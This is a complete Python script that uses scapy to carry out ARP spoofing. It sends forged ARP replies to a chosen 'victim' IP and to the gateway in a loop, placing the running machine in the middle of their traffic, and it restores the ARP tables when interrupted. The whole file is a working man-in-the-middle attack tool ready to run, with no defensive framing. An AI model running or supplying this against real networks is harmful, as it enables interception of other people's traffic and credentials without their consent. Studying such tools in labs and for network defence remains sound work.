import time
import scapy.all as scapy
import argparse



def get_arguments():
    '''captures and returns the arguments passed by the user'''
    # initizing object for taking input through argument
    parser = argparse.ArgumentParser()
    # options for user input through arguments
    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="GateWay IP.")
    options = parser.parse_args()
    if not options.target: # validating user input contains target IP or not
        parser.error("[-] Please specify an Target IP, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Please specify an Gateway IP, use --help for more info.")

    return options


def get_mac(ip: str) -> str:
    '''returns a target device MAC address by sending a packet to a target ip'''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip: str, spoof_ip: str) -> None:
    '''spoof the device by sending a fake arp packet'''
    target_mac = get_mac(target_ip) # getting a target mac addr using ip
    # creating fake arp packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) # sending a packet
    

def restore(destination_ip: str, source_ip: str) -> None:
    '''restore the arp table correctly'''
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    # sending arp packets for 4 times
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    while True:
        # sending arp packets to victim
        spoof(target_ip, gateway_ip)
        # sending arp packets to gateway
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
    
        # \r to print in same line by overriding the previous print
        print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
        time.sleep(2)
        
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Detected CTRL + C ..... Resetting ARP Tables.... Please Wait.\n")
    
finally:
    print("Exited..")